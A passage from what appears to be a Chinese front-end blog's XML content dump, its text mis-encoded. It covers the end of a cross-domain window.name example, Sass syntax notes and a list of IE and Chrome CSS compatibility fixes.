body.removeChild(inf)                      <span class="comment">//æ¸…é™¤iframe</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>båŸŸåä¸‹ data page<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    // var str = window.location.href.substr(-1,1);      //è·å–urlä¸­æºå¸¦çš„å‚æ•°å€¼h=5</span><br><span class="line">    // å› ä¸ºå·²ç»æ˜¯båŸŸåä¸‹çš„é¡µé¢äº†ï¼Œå¯ä»¥é€šè¿‡è¯·æ±‚å„ç§båŸŸåä¸‹çš„æ•°æ®å†è®¾ç½®window.nameçš„å€¼</span><br><span class="line">    window.name = &apos;some data&apos;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://www.xiaolai.cc/2018/11/02/js%E8%B7%A8%E5%9F%9F/" target="_blank" rel="noopener">jsè·¨åŸŸ</a></li><li><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">è·¨åŸŸèµ„æºå…±äº« CORS è¯¦è§£</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Sasså¸¸ç”¨å‘½ä»¤</title>
      <link href="/2018/11/06/Sass%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/11/06/Sass%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>Sassæ˜¯ä¸€æ¬¾å¼ºåŒ–CSSçš„è¾…åŠ©åŠŸèƒ½ï¼Œå®ƒåœ¨CSSè¯­æ³•ä¸Šå¢åŠ äº†å˜é‡ï¼ŒåµŒå¥—ï¼Œæ··åˆï¼Œå¯¼å…¥ç­‰åŠŸèƒ½ã€‚ ä½ è¿˜å¯ä»¥é€šè¿‡å‡½æ•°è¿›è¡Œé¢œè‰²å€¼ä¸å±æ€§å€¼å¾—è¿ç®—ï¼Œä½¿ç”¨æ§åˆ¶æŒ‡ä»¤(control directives)ç­‰é«˜çº§åŠŸèƒ½ã€‚<br><br></p><h3 id="1-ç¼–è¯‘sass"><a href="#1-ç¼–è¯‘sass" class="headerlink" title="1. ç¼–è¯‘sass"></a>1. ç¼–è¯‘sass</h3><p>â€“watch ç›‘å¬<br>â€“style è§£æåçš„cssæ˜¯ä»€ä¹ˆæ’ç‰ˆæ ¼å¼ nested / expanded / compact / compressed(å‹ç¼©)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sass input.scss output.scss</span><br><span class="line">sass --watch input.scss:output.scss</span><br><span class="line">sass --watch app/sass:public/stylesheets</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-å¯¼å…¥sass"><a href="#2-å¯¼å…¥sass" class="headerlink" title="2. å¯¼å…¥sass"></a>2. å¯¼å…¥sass</h3><ul><li>å¯¼å…¥å±€éƒ¨æ–‡ä»¶<br>@import è§„åˆ™è§„åˆ™ä¸éœ€è¦æŒ‡æ˜è¢«å¯¼å…¥æ–‡ä»¶çš„å…¨åï¼Œå¯ä»¥çœç•¥ .sass æˆ– .scss æ–‡ä»¶åç¼€ã€‚<br>å¦‚æœéœ€è¦å¯¼å…¥sassæ–‡ä»¶ï¼Œä½†åˆä¸å¸Œæœ›å°†å…¶ç¼–è¯‘ä¸ºCSSï¼Œåªéœ€åœ¨æ–‡ä»¶åå‰æ·»åŠ ä¸‹åˆ’çº¿ï¼Œè¿™æ ·ä¼šå‘Šè¯‰sassä¸è¦ç¼–è¯‘è¿™äº›æ–‡ä»¶ã€‚å¯¼å…¥è¯­å¥ä¸­ä¸éœ€è¦æ·»åŠ ä¸‹åˆ’çº¿ã€‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@import &quot;colors&quot;</span><br></pre></td></tr></table></figure></li></ul><p>å¯¼å…¥çš„å…¶å®æ˜¯ _colors.scss</p><ul><li>CSSè§„åˆ™å†…å¯¼å…¥<br>@import æ–‡ä»¶å¯¼å…¥åˆ°ä¸€ä¸ªCSSè§„åˆ™å†…<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// _blue-theme.scss</span><br><span class="line">aside&#123; background: blue &#125;</span><br><span class="line"></span><br><span class="line">// main.scss</span><br><span class="line">.container&#123; @import &quot;blue-theme&quot; &#125;</span><br><span class="line">.contaienr&#123;</span><br><span class="line">  aside&#123; background: blue &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-å˜é‡"><a href="#3-å˜é‡" class="headerlink" title="3. å˜é‡"></a>3. å˜é‡</h3><ul><li><p><em>$</em><br>å®šä¹‰å˜é‡ï¼Œå˜é‡æ”¯æŒå—çº§ä½œç”¨åŸŸï¼ŒåµŒå¥—è§„åˆ™å†…å®šä¹‰çš„å˜é‡åªèƒ½åœ¨åµŒå¥—è§„åˆ™å†…ä½¿ç”¨(å±€éƒ¨å˜é‡)ã€‚å°†å±€éƒ¨å˜é‡è½¬æ¢ä¸ºå…¨å±€å˜é‡å¯æ·»åŠ <code>!global</code>å£°æ˜ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$blue: #4788C7;</span><br><span class="line">$border: 1px solid $blue;</span><br><span class="line">.nav&#123;</span><br><span class="line">  border: $border;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><em>&amp;</em><br>è¡¨ç¤ºçˆ¶é€‰æ‹©å™¨ï¼Œå¸¸ç”¨äºæ·»åŠ ä¼ªç±»</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">article a &#123;</span><br><span class="line">  &amp;:hover &#123; color: red &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿéšåç¼€ç”Ÿæˆå¤åˆçš„é€‰æ‹©å™¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#main &#123; &amp;-sidebar&#123; color: red &#125;&#125;</span><br><span class="line">#main-sidebar&#123; color: red &#125;</span><br></pre></td></tr></table></figure></li><li><p><em>@minxin, @include</em><br>æ··åˆå™¨ï¼Œå®ç°å¤§æ®µæ ·å¼çš„é‡ç”¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@mixin rounded-corners&#123; border-radius: 5px &#125;</span><br><span class="line">notice&#123; @include rounded-corners &#125;</span><br></pre></td></tr></table></figure><p>æ··åˆå™¨ä¼ å‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@mixin link-colors($normal, $hover)&#123;</span><br><span class="line">  color: $normal;</span><br><span class="line">  &amp;:hover&#123; color: $hover &#125;;</span><br><span class="line">&#125;</span><br><span class="line">a&#123; @inclue link-color($normal: blue, $hover: red) &#125;</span><br></pre></td></tr></table></figure></li><li><p><em>%</em><br>å ä½ç¬¦é€‰æ‹©å™¨ï¼Œå¿…é¡»ä½¿ç”¨@extendæŒ‡ä»¤è°ƒç”¨ã€‚</p></li><li><p><em>@extend</em><br>åœ¨è®¾è®¡ç½‘é¡µæ—¶å¸¸å¸¸ä¼šé‡åˆ°è¿™æ ·çš„æƒ…å†µï¼šä¸€ä¸ªå…ƒç´ ä½¿ç”¨çš„æ ·å¼ä¸å¦ä¸€ä¸ªå…ƒç´ å®Œå…¨ç›¸åŒï¼Œä½†åˆæ·»åŠ äº†é¢å¤–çš„æ ·å¼ã€‚æˆ‘ä»¬é€šå¸¸ä¼šåœ¨HTMLä¸­ç»™å…ƒç´ å®šä¹‰ä¸¤ä¸ªclassï¼Œä¸€ä¸ªé€šç”¨æ ·å¼ï¼Œä¸€ä¸ªç‰¹æ®Šæ ·å¼ã€‚å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;error seriousError&quot;&gt;Oh! Crash&lt;div&gt;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>@extend</code>å°†ä¸€ä¸ªé€‰æ‹©å™¨ä¸‹çš„æ‰€æœ‰æ ·å¼ç»§æ‰¿ç»™å¦ä¸€ä¸ªé€‰æ‹©å™¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.error&#123;</span><br><span class="line">  color: red;</span><br><span class="line">&#125;</span><br><span class="line">.serioutsErro&#123;</span><br><span class="line">  @extend .error;</span><br><span class="line">  border-width: 3px;</span><br><span class="line">&#125;</span><br><span class="line">.hoverlink&#123;</span><br><span class="line">  @extend a:hover</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="4-å…¶å®ƒè¯­æ³•"><a href="#4-å…¶å®ƒè¯­æ³•" class="headerlink" title="4. å…¶å®ƒè¯­æ³•"></a>4. å…¶å®ƒè¯­æ³•</h3><ul><li><p><em>!default</em><br>é»˜è®¤å˜é‡å€¼ï¼Œå¦‚æœè¿™ä¸ªå˜é‡è¢«å£°æ˜èµ‹å€¼äº†ï¼Œé‚£å°±ç”¨å£°æ˜çš„å€¼ï¼Œå¦åˆ™ç”¨è¿™ä¸ªé»˜è®¤å€¼ã€‚(å¾ˆåƒ!importantçš„å¯¹ç«‹é¢)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$blue: #4788C7 !default;</span><br></pre></td></tr></table></figure></li><li><p><em>.classA{ @extend .classB }</em><br>ä½¿ç”¨é€‰æ‹©å™¨ç»§æ‰¿æ¥ç²¾ç®€CSS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.error&#123; background: red &#125;</span><br><span class="line">.seriousError&#123; @extend .error &#125;</span><br></pre></td></tr></table></figure></li><li><p><em>å±æ€§åµŒå¥—</em><br>ä¸ºäº†ä¾¿äºç®¡ç†æœ‰ç›¸åŒå‘½åç©ºé—´çš„å±æ€§ï¼Œsasså…è®¸å°†å±æ€§åµŒå¥—åœ¨å‘½åç©ºé—´ä¸­ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a&#123;</span><br><span class="line">  font: &#123;</span><br><span class="line">    size: 14px;</span><br><span class="line">    weight: normal;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="5-SassScript"><a href="#5-SassScript" class="headerlink" title="5. SassScript"></a>5. SassScript</h3><h4 id="5-1-Interactive-Shell"><a href="#5-1-Interactive-Shell" class="headerlink" title="5.1 Interactive Shell"></a>5.1 Interactive Shell</h4><p>SassScriptå¯ä½œç”¨äºä»»ä½•å±æ€§ï¼Œå…è®¸å±æ€§ä½¿ç”¨å˜é‡ã€ç®—æ•°è¿ç®—ç­‰é¢å¤–åŠŸèƒ½ã€‚åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥<code>sass -i</code>ï¼Œå¯ä»¥è¾“å…¥æƒ³è¦æµ‹è¯•çš„SassScriptæŸ¥çœ‹è¾“å‡ºç»“æœã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sass -i</span><br><span class="line">&gt;&gt; 1px + 1px</span><br><span class="line">2px</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-2-å˜é‡ä¸è¿ç®—"><a href="#5-2-å˜é‡ä¸è¿ç®—" class="headerlink" title="5.2 å˜é‡ä¸è¿ç®—"></a>5.2 å˜é‡ä¸è¿ç®—</h4><ul><li><p><strong>æ”¯æŒçš„æ•°æ®ç±»å‹</strong><br>æ•°å­—(10,10px)ï¼Œå­—ç¬¦ä¸²ï¼Œé¢œè‰²(blue, #fff)ï¼Œå¸ƒå°”å€¼(true, false)ï¼Œæ§åˆ¶(null)ï¼Œæ•°ç»„(10px 20px, Arial, sans-serif)ï¼Œmaps(key1: value1, key2: value2)</p></li><li><p><strong>æ’å€¼è¯­å¥</strong><br>ç”¨<em><code>#{}</code></em>æ’å€¼è¯­å¥å°†å˜é‡åŒ…è£¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$name: foo;</span><br><span class="line">p.#&#123;name&#125;&#123;</span><br><span class="line">  color:blue;</span><br><span class="line">&#125;</span><br><span class="line">font-size: $&#123;$font-size&#125;/$&#123;$line-height&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>è¿ç®—</strong><br><code>width: 10px/8px</code></p></li><li><p><strong>é¢œè‰²å€¼è¿ç®—</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#010203 + #040506 = #050709</span><br><span class="line">#010203 * 2 = #020406</span><br><span class="line"></span><br><span class="line">// å¿…é¡»æ‹¥æœ‰ç›¸åŒçš„alphaå€¼æ‰èƒ½è¿ç®—ï¼Œç®—æœ¯è¿ç®—ä¸ä¼šä½œç”¨äºalphaå€¼</span><br><span class="line">rgba(255,0,0,0.75) + rgba(0,255,0,0.75) = rgba(255,255,0,0.75) </span><br><span class="line"></span><br><span class="line">// alphaå€¼å¯ä»¥é€šè¿‡opacityæˆ–transparentizeä¸¤ä¸ªå‡½æ•°è¿›è¡Œè°ƒæ•´</span><br><span class="line">$red: rgba(255,0,0,0.5)</span><br><span class="line">opacity($red, 0.3)           = rgba(255,0,0,0.5)</span><br><span class="line">transparentize($red, 0.25)   = rgba(255,0,0,0.25)</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="5-3-media"><a href="#5-3-media" class="headerlink" title="5.3 @media"></a>5.3 @media</h4><p>@mediaå¯ä»¥ä½¿ç”¨SassScriptä»£æ›¿æ¡ä»¶çš„åç§°æˆ–å€¼<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$media: screen;</span><br><span class="line">$feature: max-width;</span><br><span class="line">$value: 576px;</span><br><span class="line">@media #&#123;$media&#125; and ($feature: $value)&#123;</span><br><span class="line">  .sidebar&#123; width: 500px &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-4-if"><a href="#5-4-if" class="headerlink" title="5.4 @if"></a>5.4 @if</h4><p>å½“@ifçš„è¡¨è¾¾å¼è¿”å›å€¼ä¸æ˜¯falseæˆ–nullæ—¶ï¼Œæ¡ä»¶æˆç«‹ï¼Œè¾“å‡º{}å†…çš„ä»£ç ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$type: monster;</span><br><span class="line">p&#123;</span><br><span class="line">  @if type == ocean&#123;</span><br><span class="line">    color: blue;</span><br><span class="line">  &#125; @else if $type == monster&#123;</span><br><span class="line">    color: green;</span><br><span class="line">  &#125; @else&#123;</span><br><span class="line">    color: black;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-5-for-each"><a href="#5-5-for-each" class="headerlink" title="5.5 @for, @each"></a>5.5 @for, @each</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@for $i from 1 through 3&#123;</span><br><span class="line">  .item-#&#123;$i&#125;&#123;</span><br><span class="line">    width: 2em * $i;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@each $animal in puma, sea-slug, egret, salamander&#123;</span><br><span class="line">  .#&#123;$animal&#125;-icon&#123;</span><br><span class="line">    background: url(&apos;/images/#&#123;$animal&#125;.png&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@each $animal, $color, $cursor in (puma, black, default),</span><br><span class="line">                                  (sea-slug, blue, pointer),</span><br><span class="line">                                  (egret, white, move) &#123;</span><br><span class="line">  .#&#123;$animal&#125;-icon &#123;</span><br><span class="line">    background-image: url(&apos;/images/#&#123;$animal&#125;.png&apos;);</span><br><span class="line">    border: 2px solid $color;</span><br><span class="line">    cursor: $cursor;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="5-6-while"><a href="#5-6-while" class="headerlink" title="5.6 @while"></a>5.6 @while</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$i: 6;</span><br><span class="line">@while $i&gt;0&#123;</span><br><span class="line">  .item-#&#123;$i&#125;&#123; width: 2em * $i&#125;</span><br><span class="line">  $i: $i -2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="5-7-function"><a href="#5-7-function" class="headerlink" title="5.7 @function"></a>5.7 @function</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$grid-width: 40px;</span><br><span class="line">$gutter-width: 10px;</span><br><span class="line"></span><br><span class="line">@function grid-width($n)&#123;</span><br><span class="line">  @return $n * $grid-width + ($n - 1) * $gutter-width;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#sidebar&#123; width: grid-width(5) &#125;</span><br></pre></td></tr></table></figure><h4 id="6-å…¶ä»–"><a href="#6-å…¶ä»–" class="headerlink" title="6. å…¶ä»–"></a>6. å…¶ä»–</h4><h4 id="6-1-calcåœ¨lessç¼–è¯‘æ—¶è¢«è®¡ç®—"><a href="#6-1-calcåœ¨lessç¼–è¯‘æ—¶è¢«è®¡ç®—" class="headerlink" title="6.1 calcåœ¨lessç¼–è¯‘æ—¶è¢«è®¡ç®—"></a>6.1 calcåœ¨lessç¼–è¯‘æ—¶è¢«è®¡ç®—</h4><p><code>{width: calc(100% - 30px)}</code>Lessä¼šæŠŠè¿™ä¸ªå½“æˆè¿ç®—å¼å»æ‰§è¡Œï¼Œè§£ææˆ<code>{width: calc(70%)}</code>ã€‚æ”¹å˜å†™æ³•:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div&#123; width: calc(~&quot;100% - 30px&quot;)&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>IEå…¼å®¹é—®é¢˜</title>
      <link href="/2018/11/06/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%BC%E5%AE%B9/"/>
      <url>/2018/11/06/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%BC%E5%AE%B9/</url>
      <content type="html"><![CDATA[<h4 id="1-è®¾ç½®IE-lt-select-gt-ä¸‹æ‹‰ç®­å¤´"><a href="#1-è®¾ç½®IE-lt-select-gt-ä¸‹æ‹‰ç®­å¤´" class="headerlink" title="1. è®¾ç½®IE&lt;select&gt; ä¸‹æ‹‰ç®­å¤´"></a>1. è®¾ç½®IE<code>&lt;select&gt;</code> ä¸‹æ‹‰ç®­å¤´</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">select</span><span class="selector-pseudo">::-ms-expand</span> &#123; <span class="attribute">display</span>: none; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">select</span> &#123;</span><br><span class="line">  <span class="attribute">appearance</span>:none;</span><br><span class="line">  <span class="attribute">-moz-appearance</span>:none;</span><br><span class="line">  <span class="attribute">-webkit-appearance</span>:none;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">"http://ourjs.github.io/static/2015/arrow.png"</span>) no-repeat scroll right center transparent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2018/11/06/æµè§ˆå™¨å…¼å®¹/2.png" style="width:250px"><br><br></p><h4 id="2-æ¸…é™¤IE-lt-select-gt-é€‰ä¸­åçš„è“è‰²èƒŒæ™¯"><a href="#2-æ¸…é™¤IE-lt-select-gt-é€‰ä¸­åçš„è“è‰²èƒŒæ™¯" class="headerlink" title="2. æ¸…é™¤IE&lt;select&gt;é€‰ä¸­åçš„è“è‰²èƒŒæ™¯"></a>2. æ¸…é™¤IE<code>&lt;select&gt;</code>é€‰ä¸­åçš„è“è‰²èƒŒæ™¯</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select::-ms-value&#123;</span><br><span class="line">  background: transparent;</span><br><span class="line">  color: #000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2018/11/06/æµè§ˆå™¨å…¼å®¹/3.png" style="width:250px"><br><br></p><h4 id="3-å»é™¤IE-lt-input-gt-æ¸…é™¤æŒ‰é’®"><a href="#3-å»é™¤IE-lt-input-gt-æ¸…é™¤æŒ‰é’®" class="headerlink" title="3. å»é™¤IE&lt;input&gt;æ¸…é™¤æŒ‰é’®"></a>3. å»é™¤IE<code>&lt;input&gt;</code>æ¸…é™¤æŒ‰é’®</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">input::-ms-clear&#123;</span><br><span class="line">  width: 0;</span><br><span class="line">  height: 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2018/11/06/æµè§ˆå™¨å…¼å®¹/1.png" style="width:400px"><br><br></p><h4 id="4-å»é™¤chromæµè§ˆå™¨è®°ä½å¯†ç "><a href="#4-å»é™¤chromæµè§ˆå™¨è®°ä½å¯†ç " class="headerlink" title="4. å»é™¤chromæµè§ˆå™¨è®°ä½å¯†ç "></a>4. å»é™¤chromæµè§ˆå™¨è®°ä½å¯†ç </h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;username&quot; autocomplete=&quot;off&quot; /&gt;</span><br><span class="line">&lt;input name=&quot;password&quot; autocomplete=&quot;new-password&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="5-å»é™¤-lt-a-gt-ç‚¹å‡»æ—¶çš„ç°è‰²èƒŒæ™¯"><a href="#5-å»é™¤-lt-a-gt-ç‚¹å‡»æ—¶çš„ç°è‰²èƒŒæ™¯" class="headerlink" title="5. å»é™¤&lt;a&gt;ç‚¹å‡»æ—¶çš„ç°è‰²èƒŒæ™¯"></a>5. å»é™¤<code>&lt;a&gt;</code>ç‚¹å‡»æ—¶çš„ç°è‰²èƒŒæ™¯</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a,a:hover,a:active,a:visited,a:link,a:focus&#123;</span><br><span class="line">  -webkit-tap-highlight-color:rgba(0,0,0,0);</span><br><span class="line">  -webkit-tap-highlight-color: transparent;</span><br><span class="line">  outline:none;</span><br><span class="line">  text-decoration: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2018/11/06/æµè§ˆå™¨å…¼å®¹/4.png" style="width:250px"><br><br></p><h4 id="6-favicon-ico"><a href="#6-favicon-ico" class="headerlink" title="6. favicon.ico"></a>6. favicon.ico</h4><p>Chrome, firefoxè¯·æ±‚çš„æ˜¯: linkçš„hrefæ‰€å¯¹åº”çš„å›¾æ ‡<br>æœç‹—æµè§ˆå™¨, 360æµè§ˆå™¨, qqæµè§ˆå™¨è¯·æ±‚çš„æ˜¯: <code>http://host:3529/favicon.ico</code> æˆ– <code>http://host/favicon.ico</code> (360æµè§ˆå™¨ä¼šå¿½ç•¥ç«¯å£)</p><p><em>å¦‚æœè¦è®©favicon.icoçš„å…¼å®¹æ€§æ›´å¥½: æœ€å¥½æ”¾åœ¨æ ¹ç›®å½•</em></p><ul><li>æ£€æŸ¥ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„favicon.ico, å›¾æ ‡æ˜¯å¦æ­£ç¡®</li><li>ç¡®ä¿ä½¿ç”¨çš„æ˜¯æ ¹ç›®å½• host/favicon.ico<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;icon&quot; href=&quot;http://host/favicon.ico&quot; type=&quot;image/x-icon&quot;&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="7-ç»‘å®šäº‹ä»¶"><a href="#7-ç»‘å®šäº‹ä»¶" class="headerlink" title="7. ç»‘å®šäº‹ä»¶"></a>7. ç»‘å®šäº‹ä»¶</h4><ul><li>IEæ”¯æŒattachEvent, detachEvent</li><li>Chromeå’Œfirefoxæ”¯æŒaddEventListener, removeEventListener<br><br></li></ul><h4 id="8-IE-min-heightåœ¨flexå®¹å™¨é‡Œæ— æ•ˆ"><a href="#8-IE-min-heightåœ¨flexå®¹å™¨é‡Œæ— æ•ˆ" class="headerlink" title="8. IE min-heightåœ¨flexå®¹å™¨é‡Œæ— æ•ˆ"></a>8. IE min-heightåœ¨flexå®¹å™¨é‡Œæ— æ•ˆ</h4><p>ä¸Šä¸­ä¸‹å¸ƒå±€ï¼Œåœ¨åŸæœ‰wrapperå¤–æ·»åŠ <em><code>.app{ display: flex }</code></em>ã€‚<br>Chorme, Firefox, Safari, IE11, IE10æœ‰æ•ˆ <a href="/2018/11/06/CSS-example/#5-flex-%E4%B8%8A%E4%B8%AD%E4%B8%8B%E5%B8%83%E5%B1%80">å…·ä½“æŸ¥çœ‹</a></p><p><br></p><h4 id="9-IE-ä¸æ”¯æŒcsså±æ€§å€¼unset"><a href="#9-IE-ä¸æ”¯æŒcsså±æ€§å€¼unset" class="headerlink" title="9. IE ä¸æ”¯æŒcsså±æ€§å€¼unset"></a>9. IE ä¸æ”¯æŒcsså±æ€§å€¼<code>unset</code></h4><p>ç”¨<code>initial</code>ä»£æ›¿</p><p><br></p><h4 id="10-IE11-flexå¤šåˆ—å¸ƒå±€-æ— è§†border-box"><a href="#10-IE11-flexå¤šåˆ—å¸ƒå±€-æ— è§†border-box" class="headerlink" title="10. IE11 flexå¤šåˆ—å¸ƒå±€ æ— è§†border-box"></a>10. IE11 flexå¤šåˆ—å¸ƒå±€ æ— è§†<code>border-box</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 